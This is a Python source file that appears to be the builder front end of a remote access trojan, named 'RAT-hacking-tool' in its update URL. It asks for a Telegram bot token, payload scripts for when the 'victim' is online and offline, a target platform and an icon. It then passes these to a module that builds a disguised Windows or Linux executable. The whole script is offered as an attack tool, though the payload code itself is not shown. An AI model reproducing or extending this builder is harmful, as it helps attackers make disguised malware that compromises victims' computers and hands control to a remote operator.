# Import libraries
from colorama import init, Fore, Style
from random import randint
from modules import make
from json import loads
import requests
import os

# setup the  colorama library
init()

# create functions
def clear(): # clear the terminal after check the OS
    os.system('cls' if os.name == 'nt' else 'clear')
def banner(): # print a random banner each time
    # define the banners
    banners = [r"""

          _____                            _____                        _____                            _____  
         /\    \                          /\    \                      /\    \                          /\    \ 
        /::\____\                        /::\    \                    /::\    \                        /::\____\
       /::::|   |                       /::::\    \                   \:::\    \                      /:::/    /
      /:::::|   |                      /::::::\    \                   \:::\    \                    /:::/    / 
     /::::::|   |                     /:::/\:::\    \                   \:::\    \                  /:::/    /  
    /:::/|::|   |                    /:::/__\:::\    \                   \:::\    \                /:::/    /   
   /:::/ |::|   |                    \:::\   \:::\    \                  /::::\    \              /:::/    /    
  /:::/  |::|___|______            ___\:::\   \:::\    \                /::::::\    \            /:::/    /     
 /:::/   |::::::::\    \          /\   \:::\   \:::\    \              /:::/\:::\    \          /:::/    /      
/:::/    |:::::::::\____\        /::\   \:::\   \:::\____\            /:::/  \:::\____\        /:::/____/       
\::/    / ~~~~~/:::/    /        \:::\   \:::\   \::/    /           /:::/    \::/    /        \:::\    \       
 \/____/      /:::/    /          \:::\   \:::\   \/____/           /:::/    / \/____/          \:::\    \      
             /:::/    /            \:::\   \:::\    \              /:::/    /                    \:::\    \     
            /:::/    /              \:::\   \:::\____\            /:::/    /                      \:::\    \    
           /:::/    /                \:::\  /:::/    /            \::/    /                        \:::\    \   
          /:::/    /                  \:::\/:::/    /              \/____/                          \:::\    \  
         /:::/    /                    \::::::/    /                                                 \:::\    \ 
        /:::/    /                      \::::/    /                                                   \:::\____\ 
        \::/    /                        \::/    /                                                     \::/    /
         \/____/                          \/____/                                                       \/____/ 
                                                                                                                    
""", """
                                                                                                                
MMMMMMMM               MMMMMMMM        SSSSSSSSSSSSSSS      TTTTTTTTTTTTTTTTTTTTTTT     LLLLLLLLLLL             
M:::::::M             M:::::::M      SS:::::::::::::::S     T:::::::::::::::::::::T     L:::::::::L             
M::::::::M           M::::::::M     S:::::SSSSSS::::::S     T:::::::::::::::::::::T     L:::::::::L             
M:::::::::M         M:::::::::M     S:::::S     SSSSSSS     T:::::TT:::::::TT:::::T     LL:::::::LL             
M::::::::::M       M::::::::::M     S:::::S                 TTTTTT  T:::::T  TTTTTT       L:::::L               
M:::::::::::M     M:::::::::::M     S:::::S                         T:::::T               L:::::L               
M:::::::M::::M   M::::M:::::::M      S::::SSSS                      T:::::T               L:::::L               
M::::::M M::::M M::::M M::::::M       SS::::::SSSSS                 T:::::T               L:::::L               
M::::::M  M::::M::::M  M::::::M         SSS::::::::SS               T:::::T               L:::::L               
M::::::M   M:::::::M   M::::::M            SSSSSS::::S              T:::::T               L:::::L               
M::::::M    M:::::M    M::::::M                 S:::::S             T:::::T               L:::::L               
M::::::M     MMMMM     M::::::M                 S:::::S             T:::::T               L:::::L         LLLLLL
M::::::M               M::::::M     SSSSSSS     S:::::S           TT:::::::TT           LL:::::::LLLLLLLLL:::::L
M::::::M               M::::::M     S::::::SSSSSS:::::S           T:::::::::T           L::::::::::::::::::::::L
M::::::M               M::::::M     S:::::::::::::::SS            T:::::::::T           L::::::::::::::::::::::L
MMMMMMMM               MMMMMMMM      SSSSSSSSSSSSSSS              TTTTTTTTTTT           LLLLLLLLLLLLLLLLLLLLLLLL
                                                                                                                
""", """

 _______    _______   _________   _       
(       )  (  ____ \  \__   __/  ( \      
| () () |  | (    \/     ) (     | (      
| || || |  | (_____      | |     | |      
| |(_)| |  (_____  )     | |     | |      
| |   | |        ) |     | |     | |      
| )   ( |  /\____) |     | |     | (____/\ 
|/     \|  \_______)     )_(     (_______/
                                          
""", """

.        :        .::::::.     ::::::::::::     :::     
;;,.    ;;;      ;;;`    `     ;;;;;;;;''''     ;;;     
[[[[, ,[[[[,     '[==/[[[[,         [[          [[[     
$$$$$$$$"$$$       '''    $         $$          $$'     
888 Y88" 888o     88b    dP         88,        o88oo,.__
MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM

"""]
    # clear terminal
    clear()
    # print banner
    print(Fore.CYAN + banners[randint(0, 3)] + Style.RESET_ALL)
def same_banner(): # print a same banner each time
    # define banner
    banner ="""
 _______    _______   _________   _       
(       )  (  ____ \  \__   __/  ( \      
| () () |  | (    \/     ) (     | (      
| || || |  | (_____      | |     | |      
| |(_)| |  (_____  )     | |     | |      
| |   | |        ) |     | |     | |      
| )   ( |  /\____) |     | |     | (____/\ 
|/     \|  \_______)     )_(     (_______/                                       
"""
    # print banner
    print(Fore.CYAN + banner)
def check_update(): # send a request to github repo to check updates
    try:
        # send a request to log/version.json file in github repo and read it and save it in 'online_version'
        online_version = loads(requests.get("https://raw.githubusercontent.com/Farbod-Parkhooi/RAT-hacking-tool/main/log/version.json").text)
        # read the log/version.json file
        with open("log/version.json", "r") as file:
            # save the text of file in 'local_version'
            local_version = loads(file.read())
        # check the different between 'online_version' and 'offline_version' (if they are different it exit from program)
        if online_version["version"] == local_version["version"]: pass 
        else: 
            print(Fore.RED + "Please update the program with 'git pull' command.")
            exit()
    except: 
        print(Fore.RED + "Please check your internet connection. Then, try again.")
        exit()
def get_options(): # get all of inputs and make python file
    try: 
        # get inputs
        id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
        token = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram bot token here: ")).lower()
        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()      
        try:
            max_letter = int(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your max letter value(after that bot send you a link on note. its faster! | just write number without space): "))  
        except: print(Fore.RED + "Invalid input(Just write number without space)."), exit()
        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads): ")).lower()    
        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is offline(befor that check the imported libraries in bulder/windows-build or bulder/linux-build | and you can use standard Tkinter payloads. check them out from builder/tk_payloads/offline): ")).lower()    
        platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " choice your platform(windows, linux, mac): ")).lower()
        icon_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your icon file address(.ico): "))
        # validate the inputs
        if platform_inp.startswith("win"):
            platform = "builder/windows-build.py"
        elif platform_inp.startswith("linux"): 
            platform = "builder/linux-build.py"
        elif platform_inp.startswith("mac"): 
            print(Fore.RED + "Mac builder doesn't exist. Sorry.")
            exit()
        else: 
            print(Fore.RED + "This platform dosnt exist!")
            exit()
        offline_code_addr = offline_code_addr_inp if offline_code_addr_inp.endswith(".py") else "builder/tk_payloads/offline/no_internet.py"
        icon = icon_inp if icon_inp.endswith(".ico") else print("ERROR WHILE READING ICON"), "icongallery/icon.ico"
        print(f"ICON : {icon}")
        code_addr = code_addr_inp if code_addr_inp.endswith(".py") else "builder/tk_payloads/password_maker.py"
        # make python file
        make.make_python(ID=id, TOKEN=token, NAME=name, MAX_LETTER=max_letter, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
        exe = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
        # make the exe and exit from program
        make.make_exe(NAME=name, ICON=icon) if exe == "y" else exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
    except ValueError: print(Fore.RED + "Invalid input."), exit()
    except KeyboardInterrupt: exit(f"\n\n\{Fore.CYAN}nGood Luck{banner.Style.RESET_ALL}\n\n")
